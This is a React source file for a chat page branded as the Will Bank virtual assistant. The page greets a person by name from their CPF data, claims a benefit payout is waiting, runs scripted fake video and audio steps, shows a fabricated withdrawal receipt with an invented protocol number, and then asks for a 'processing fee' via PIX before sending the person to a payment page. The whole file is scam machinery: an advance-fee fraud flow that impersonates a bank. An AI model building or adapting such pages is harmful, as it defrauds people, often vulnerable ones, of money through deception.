import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Send, Volume2, Play, CheckCircle, Clock, User, Loader2 } from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

interface ChatMessage {
  id: string;
  type: "bot" | "user";
  content: string;
  isAudio?: boolean;
  isVideo?: boolean;
  isComprovante?: boolean;
  comprovanteData?: {
    nome: string;
    cpf: string;
    valor: string;
    data: string;
    protocolo: string;
  };
  timestamp: Date;
}

const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Start chat flow
    startChatFlow();
  }, [cpfData, valorBeneficio, navigate]);

  const startChatFlow = async () => {
    // Initial greeting with delay
    await delay(1000);
    addBotMessage(`Olá ${cpfData?.nome.split(' ')[0]}! 👋`);
    
    await delay(2000);
    addBotMessage("Sou a assistente virtual do Will Bank. Vou te ajudar a realizar o saque do seu benefício.");
    
    await delay(2500);
    addBotMessage(`Identifiquei que você tem um valor de R$ ${valorBeneficio?.toLocaleString('pt-BR')},00 disponível para saque.`);
    
    await delay(2000);
    addBotMessage("Antes de prosseguir, preciso que você assista a um vídeo com instruções importantes:", false, true);
    
    setCurrentStep(1);
  };

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const addBotMessage = (content: string, isAudio = false, isVideo = false, isComprovante = false, comprovanteData?: ChatMessage["comprovanteData"]) => {
    setIsTyping(true);
    setTimeout(() => {
      setMessages(prev => [...prev, {
        id: Date.now().toString(),
        type: "bot",
        content,
        isAudio,
        isVideo,
        isComprovante,
        comprovanteData,
        timestamp: new Date()
      }]);
      setIsTyping(false);
    }, 800);
  };

  const addUserMessage = (content: string) => {
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      type: "user",
      content,
      timestamp: new Date()
    }]);
  };

  const handleVideoWatched = async () => {
    addUserMessage("Assisti o vídeo ✓");
    
    await delay(1500);
    addBotMessage("Ótimo! Agora vou enviar um áudio com mais detalhes:");
    
    await delay(1000);
    // Audio placeholder
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      type: "bot",
      content: "Áudio com instruções detalhadas",
      isAudio: true,
      timestamp: new Date()
    }]);
    
    setCurrentStep(2);
  };

  const handleAudioListened = async () => {
    addUserMessage("Ouvi o áudio ✓");
    
    await delay(1500);
    addBotMessage("Perfeito! Agora vou gerar seu comprovante de saque...");
    
    await delay(2000);
    
    // Generate comprovante
    const protocolo = `WB${Date.now().toString().slice(-8)}`;
    const dataAtual = new Date().toLocaleDateString('pt-BR');
    
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      type: "bot",
      content: "Comprovante de Solicitação de Saque",
      isComprovante: true,
      comprovanteData: {
        nome: cpfData?.nome || "",
        cpf: cpfData?.cpf || "",
        valor: `R$ ${valorBeneficio?.toLocaleString('pt-BR')},00`,
        data: dataAtual,
        protocolo
      },
      timestamp: new Date()
    }]);
    
    await delay(2000);
    addBotMessage("Seu comprovante foi gerado com sucesso! 🎉");
    
    await delay(1500);
    addBotMessage("Para finalizar o saque, é necessário pagar uma pequena taxa de processamento via PIX.");
    
    setCurrentStep(3);
  };

  const handleProsseguirPagamento = () => {
    navigate("/saque", { state: { cpfData, valorBeneficio } });
  };

  const handleSendMessage = () => {
    if (!inputValue.trim()) return;
    
    addUserMessage(inputValue);
    setInputValue("");
    
    // Simple response
    setTimeout(() => {
      addBotMessage("Obrigada pela mensagem! Vou analisar sua solicitação. Por favor, siga as instruções na tela para prosseguir.");
    }, 1000);
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <header className="bg-white px-4 py-3 shadow-sm sticky top-0 z-10">
        <div className="max-w-2xl mx-auto flex items-center justify-between">
          <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-full bg-[#FFE600] flex items-center justify-center">
              <User className="w-4 h-4 text-black" />
            </div>
            <span className="text-sm font-medium text-gray-700">Usuário</span>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="bg-white border-b px-4 py-2">
        <div className="max-w-2xl mx-auto flex items-center gap-2 text-xs text-gray-500">
          <span>Benefício</span>
          <span>&gt;</span>
          <span>Indenização</span>
          <span>&gt;</span>
          <span className="text-gray-900 font-medium">Atendimento</span>
        </div>
      </div>

      {/* Chat Container */}
      <main className="flex-1 overflow-y-auto px-4 py-6">
        <div className="max-w-2xl mx-auto space-y-4">
          {messages.map((message) => (
            <div
              key={message.id}
              className={`flex ${message.type === "user" ? "justify-end" : "justify-start"}`}
            >
              <div
                className={`max-w-[85%] rounded-2xl p-4 ${
                  message.type === "user"
                    ? "bg-[#FFE600] text-black"
                    : "bg-white shadow-sm border"
                }`}
              >
                {message.isVideo ? (
                  <div className="space-y-3">
                    <p className="text-sm">{message.content}</p>
                    <div className="relative aspect-video bg-gradient-to-br from-blue-900 to-blue-950 rounded-lg overflow-hidden">
                      <div className="absolute inset-0 flex items-center justify-center">
                        <Button
                          onClick={handleVideoWatched}
                          className="bg-[#FFE600] hover:bg-[#FFD700] text-black font-medium px-4 py-2 rounded-full flex items-center gap-2"
                        >
                          <Play className="w-4 h-4" />
                          Assistir vídeo
                        </Button>
                      </div>
                    </div>
                    <p className="text-xs text-gray-500 text-center">
                      Clique para assistir o vídeo de instruções
                    </p>
                  </div>
                ) : message.isAudio ? (
                  <div className="space-y-2">
                    <div className="flex items-center gap-3 bg-gray-100 rounded-full px-4 py-3">
                      <Button
                        onClick={handleAudioListened}
                        size="sm"
                        className="w-10 h-10 rounded-full bg-[#FFE600] hover:bg-[#FFD700] text-black p-0"
                      >
                        <Volume2 className="w-5 h-5" />
                      </Button>
                      <div className="flex-1 h-1 bg-gray-300 rounded-full">
                        <div className="h-full w-0 bg-[#FFE600] rounded-full" />
                      </div>
                      <span className="text-xs text-gray-500">0:45</span>
                    </div>
                    <p className="text-xs text-gray-500 text-center">
                      Clique para ouvir a mensagem
                    </p>
                  </div>
                ) : message.isComprovante ? (
                  <div className="space-y-3">
                    <div className="bg-gradient-to-br from-green-50 to-green-100 border-2 border-green-200 rounded-xl p-4">
                      <div className="text-center mb-4">
                        <CheckCircle className="w-12 h-12 text-green-500 mx-auto mb-2" />
                        <h3 className="font-bold text-green-800">Comprovante de Solicitação</h3>
                      </div>
                      
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-600">Nome:</span>
                          <span className="font-medium">{message.comprovanteData?.nome}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-600">CPF:</span>
                          <span className="font-medium">{message.comprovanteData?.cpf}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-600">Valor:</span>
                          <span className="font-bold text-green-600">{message.comprovanteData?.valor}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-600">Data:</span>
                          <span className="font-medium">{message.comprovanteData?.data}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-600">Protocolo:</span>
                          <span className="font-mono text-xs">{message.comprovanteData?.protocolo}</span>
                        </div>
                      </div>

                      <div className="mt-4 pt-3 border-t border-green-200 text-center">
                        <p className="text-xs text-gray-500">
                          Will Bank - Instituição Financeira
                        </p>
                      </div>
                    </div>
                  </div>
                ) : (
                  <p className="text-sm">{message.content}</p>
                )}
                
                <div className="flex items-center gap-1 mt-2">
                  <Clock className="w-3 h-3 text-gray-400" />
                  <span className="text-[10px] text-gray-400">
                    {message.timestamp.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}
                  </span>
                </div>
              </div>
            </div>
          ))}

          {isTyping && (
            <div className="flex justify-start">
              <div className="bg-white shadow-sm border rounded-2xl px-4 py-3">
                <div className="flex items-center gap-2">
                  <Loader2 className="w-4 h-4 animate-spin text-gray-400" />
                  <span className="text-sm text-gray-500">Digitando...</span>
                </div>
              </div>
            </div>
          )}

          {/* Action Button based on current step */}
          {currentStep === 3 && (
            <div className="flex justify-center pt-4">
              <Button
                onClick={handleProsseguirPagamento}
                className="bg-[#FFE600] hover:bg-[#FFD700] text-black font-bold px-8 py-6 text-lg rounded-full"
              >
                Prosseguir para pagamento →
              </Button>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>
      </main>

      {/* Input Area */}
      <div className="bg-white border-t px-4 py-3 sticky bottom-0">
        <div className="max-w-2xl mx-auto flex items-center gap-2">
          <Input
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            placeholder="Digite sua mensagem..."
            className="flex-1 rounded-full border-gray-300"
            onKeyPress={(e) => e.key === "Enter" && handleSendMessage()}
          />
          <Button
            onClick={handleSendMessage}
            size="icon"
            className="rounded-full bg-[#FFE600] hover:bg-[#FFD700] text-black"
          >
            <Send className="w-5 h-5" />
          </Button>
        </div>
      </div>

      {/* Footer */}
      <div className="bg-[#FFE600] px-4 py-3">
        <div className="max-w-2xl mx-auto flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-6 object-contain" />
        </div>
      </div>
    </div>
  );
};

export default Chat;
